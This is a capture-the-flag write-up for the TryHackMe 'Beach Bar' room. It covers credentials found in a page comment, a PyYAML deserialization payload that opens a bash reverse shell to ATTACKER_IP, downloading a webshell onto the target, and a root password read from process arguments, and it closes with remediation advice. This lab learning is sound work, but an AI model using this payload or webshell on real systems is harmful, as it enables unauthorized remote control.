Written By Aryan Giri

**Room:** Beach Bar  
**Category:** Boot2Root  
**Difficulty:** Easy  
**Room URL:** https://tryhackme.com/room/hh-beachbar-d849f7f7

---

## Scenario

The Beach Bar at the Byte Lotus Hotel offers more than drinks and music. A web-based jukebox application has been deployed in a hurry, and several insecure development practices have made their way into production.

Your objective is to obtain initial access, retrieve the user flag, escalate privileges, and capture the root flag.

---

# Enumeration

After deploying the machine, visit the target.

```text
http://MACHINE_IP
```

In my case:

```text
http://10.49.191.252/
```

The application immediately redirects to a login page.

<img width="1350" height="835" alt="Screenshot 2026-08-01 182524" src="https://github.com/user-attachments/assets/7b36f066-00b8-4640-bf12-3e70adf6c32c" />


> Login Page

---

## Source Code Review

Whenever a login page is encountered during a CTF, checking the HTML source is always worth doing.

Viewing the page source revealed an interesting developer comment containing the application's credentials.

<img width="655" height="328" alt="Screenshot 2026-08-01 182542" src="https://github.com/user-attachments/assets/f3c3a1e0-cb80-4319-91ce-c12551d76adc" />

> HTML Source Comment

Credentials discovered:

```text
Username: dj
Password: dj
```

This is an example of **sensitive information disclosure**, where developers accidentally leave debugging comments or credentials inside production code.

**MITRE ATT&CK**

- T1552 - Unsecured Credentials

---

# Dashboard

After authenticating, the dashboard becomes accessible.

<img width="1348" height="864" alt="Screenshot 2026-08-01 182645" src="https://github.com/user-attachments/assets/5314733c-78b6-4966-ab4f-67b749b2552e" />


> Dashboard

Several features are available, including:

- Export Playlist
- Import Playlist

The Export function downloads a YAML file.

<img width="633" height="236" alt="Screenshot 2026-08-01 182706" src="https://github.com/user-attachments/assets/0c936c8c-85a0-4cc9-962f-095d065b5319" />


> Exported YAML File

---

## Inspecting the YAML

The downloaded playlist looked similar to:

```yaml
playlist:
  name: Summer Mix
  vibe: golden hour
  tracks:
    - Song 1
    - Song 2
```

<img width="712" height="603" alt="Screenshot 2026-08-01 182720" src="https://github.com/user-attachments/assets/56820777-1c33-4bf4-a711-924cdbbfe155" />


> YAML Content

The presence of YAML immediately suggested checking whether the application was using an unsafe YAML deserializer.

---

# Discovering YAML Injection

After testing various payloads, it became clear that the **Import Playlist** feature was vulnerable to **unsafe YAML deserialization**.

Instead of treating YAML as plain data, the backend allowed Python objects to be constructed during parsing.

This enables arbitrary code execution.

---

# Exploiting YAML Deserialization

The following payload spawns a reverse shell using Python.

```yaml
playlist:
  name: !!python/object/apply:subprocess.Popen [["/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]]
  vibe: golden hour
  tracks: []
```

Replace:

```text
ATTACKER_IP
```

with your own attacker IP.

Paste the payload into the Import page.

<img width="847" height="709" alt="Screenshot 2026-08-01 183218" src="https://github.com/user-attachments/assets/81faa8d6-cfef-46dc-873a-b5f489da0e4a" />


> Import Page

---

## Listener

Start a Netcat listener.

```bash
nc -lvnp 4444
```

Once **Load Playlist** is clicked, the application deserializes the malicious object and executes the command.

A reverse shell is obtained.

<img width="1267" height="857" alt="Screenshot 2026-08-01 183234" src="https://github.com/user-attachments/assets/f55ba2b8-bb31-4a79-bc0e-07e1c3616f05" />

> Reverse Shell

---

# Improving Shell Stability

One issue commonly encountered during CTFs is unstable reverse shells.

If the shell freezes or disconnects unexpectedly, retriggering the exploit is not always possible. Some intentionally vulnerable applications only execute the payload once, or the service may crash after exploitation.

To avoid losing access, I uploaded my own browser-based Python webshell.

Project:

https://github.com/giriaryan694-a11y/Ary_WebShell_Py

Ary_WebShell_Py is a lightweight browser-based interactive terminal written in Python 3 for **authorized CTF competitions and security research**. It provides a persistent PTY-style interface through a web browser, making post-exploitation significantly more convenient.

---

## Downloading the Webshell

Because the TryHackMe target cannot directly access the Internet, download the script on your attacker machine first.

```bash
wget https://github.com/giriaryan694-a11y/Ary_WebShell_Py/raw/refs/heads/main/ary_webshell.py
```

<img width="671" height="511" alt="Screenshot 2026-08-01 183042" src="https://github.com/user-attachments/assets/4a6c9861-ddb3-49ed-8837-3e1bc3f32721" />

> Downloading Webshell

---

## Hosting the File

Start a temporary HTTP server.

```bash
python -m http.server
```

<img width="641" height="198" alt="Screenshot 2026-08-01 183432" src="https://github.com/user-attachments/assets/2b002882-8208-43bd-9341-08d856c0491f" />

> Python HTTP Server

---

## Transfer to Target

Download the file from the victim.

Example:

```bash
wget http://ATTACKER_IP:8000/ary_webshell.py
```

Run it.

```bash
python3 ary_webshell.py
```

<img width="701" height="458" alt="Screenshot 2026-08-01 183443" src="https://github.com/user-attachments/assets/4ea4dad2-50cf-4732-b089-d4785be0b641" />

> Running Webshell

Open:

```text
http://TARGET_IP:8888/
```

Example:

```text
http://10.49.191.252:8888/
```

The Session Manager dashboard appears.

<img width="1340" height="826" alt="Screenshot 2026-08-01 183532" src="https://github.com/user-attachments/assets/53d09b58-fef3-4526-959f-46ae25b94b86" />

> Session Manager

Create a new session to obtain an interactive browser terminal.

If one terminal freezes, simply create another session without needing to exploit the application again.

This greatly simplifies post-exploitation during CTFs.

---

# User Flag

With stable shell access established, navigate through the filesystem and locate the user flag.

<img width="1090" height="813" alt="Screenshot 2026-08-01 183719" src="https://github.com/user-attachments/assets/1375a3c9-6ebf-46cd-8239-36e7f4982624" />

> User Flag

---

# Privilege Escalation

The privilege escalation was surprisingly simple.

List running processes.

```bash
ps aux
```

Among the processes, a Python script was running as **root**.

More importantly, its command-line arguments exposed the root password in plaintext.

<img width="1651" height="44" alt="Screenshot 2026-08-01 183834" src="https://github.com/user-attachments/assets/70c0d3ae-3e5f-48f5-b60c-d4fd91d10a6d" />

> ps aux Output

(The password has been intentionally hidden in screenshots to respect TryHackMe room rules.)

This represents an example of **credential exposure through process arguments**.

Processes and their arguments are frequently visible to other local users unless properly protected.

---

## Switching to Root

Use the exposed password.

```bash
su root
```

Enter the password recovered from the process list.

A root shell is obtained.

Navigate to the root user's directory.

```bash
cd /root
cat root.txt
```

<img width="850" height="538" alt="Screenshot 2026-08-01 184108" src="https://github.com/user-attachments/assets/219912c5-823e-4b4e-9545-d6280d26c12d" />


> Root Flag

---

# Attack Chain

```text
Source Code Review
        │
        ▼
Hardcoded Credentials
        │
        ▼
Login
        │
        ▼
Export YAML
        │
        ▼
Unsafe YAML Deserialization
        │
        ▼
Remote Code Execution
        │
        ▼
Reverse Shell
        │
        ▼
Process Enumeration
        │
        ▼
Root Password Disclosure
        │
        ▼
Privilege Escalation
        │
        ▼
Root Flag
```

---

# MITRE ATT&CK Mapping

| Stage | Technique |
|--------|-----------|
| Credential Discovery | T1552 - Unsecured Credentials |
| Exploitation | T1190 - Exploit Public-Facing Application |
| Command Execution | T1059 - Command and Scripting Interpreter |
| Remote Shell | T1105 - Ingress Tool Transfer |
| Process Discovery | T1057 - Process Discovery |
| Credential Access | T1552 - Credentials in Process Arguments |
| Privilege Escalation | Valid Accounts |

---

# Security Lessons

This room demonstrates several common mistakes developers make when rapidly shipping applications.

## Never Leave Credentials in Source Code

HTML comments, JavaScript files, Git repositories, and configuration files should never contain usernames, passwords, API keys, or debugging notes.

---

## Treat YAML as Untrusted Input

Unsafe YAML deserialization has resulted in multiple real-world Remote Code Execution vulnerabilities.

Always use safe loaders.

For Python:

```python
yaml.safe_load()
```

instead of

```python
yaml.load()
```

---

## Avoid Secrets in Command-Line Arguments

Passwords supplied through command-line arguments can often be viewed by any local user via:

```bash
ps
```

Sensitive information should instead be stored using environment variables, protected configuration files, or dedicated secret management solutions.

---

## Secure File Import Features

Import functionality should validate:

- File type
- Schema
- Object types
- Data structure

before processing user-supplied content.

---

# What This Room Teaches

- Source code reconnaissance
- Credential discovery
- YAML deserialization attacks
- Remote Code Execution
- Reverse shell generation
- Shell stabilization
- File transfer techniques
- Linux enumeration
- Process inspection
- Privilege escalation
- Credential exposure through running processes

---

# Conclusion

Beach Bar is a beginner-friendly Boot2Root room that chains together multiple realistic weaknesses into a complete attack path. The room starts with simple source code inspection, progresses through unsafe YAML deserialization for remote code execution, and finishes with a classic Linux privilege escalation caused by exposed credentials in process arguments.

It also highlights an important operational lesson during CTFs: maintaining reliable shell access. Uploading a lightweight browser-based webshell after initial compromise can save significant time when reverse shells become unstable, making post-exploitation much smoother in isolated lab environments.

Although intentionally vulnerable, every issue demonstrated in this room has appeared in real-world applications in one form or another, making it an excellent exercise for understanding how seemingly minor mistakes can combine into full system compromise.
